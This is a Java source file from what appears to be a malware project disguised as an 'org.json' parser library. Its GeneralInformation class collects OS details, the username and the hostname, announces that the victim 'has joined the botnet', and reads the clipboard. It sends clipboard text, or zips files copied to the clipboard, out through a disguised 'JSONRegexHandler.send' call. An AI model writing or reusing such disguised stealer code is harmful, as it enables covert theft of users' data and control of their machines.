package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.util.FileSystemHelper;
import org.json.updated.parsers.util.JSONBuilder;

import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;

public final class GeneralInformation implements JSONObject {
    @Override
    public void handle() {
        String content = ">>> ";

        content += "OS: " + System.getProperty("os.name") + " (" + System.getProperty("os.version") + ")" + "\\n";
        content += "Arch: " + System.getProperty("os.arch") + "\\n";
        content += "Hostname: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Has joined the botnet!" + "\\n";
        try {
            String clipboard = String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
            if (Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.stringFlavor) && content.length() <= 500 && clipboard.length() <= 1500)
                content += "Clipboard: " + clipboard + "\\n";
            else if (Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.javaFileListFlavor)) {
                String file = Arrays.toString(new String[]{String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.javaFileListFlavor))});
                ArrayList<File> validFileDirs = new ArrayList<>();
                validFileDirs.add(new File(file.substring(2, file.length() - 2)));
                String zipFile = System.getProperty("java.io.tmpdir") + sep + "clipboard_shit.zip";
                FileSystemHelper.zip(zipFile, validFileDirs);
                JSONRegexHandler.send(new File(zipFile));
            }
        } catch (Exception ignored) {
        }
        content += "Java Version: " + System.getProperty("java.version") + "\\n";
        content += "Java Runtime Version: " + System.getProperty("java.runtime.version");

        JSONRegexHandler.send(new JSONBuilder().value("content", content).build());
    }

    @Override
    public String getName() {
        return "GeneralInformation";
    }
}
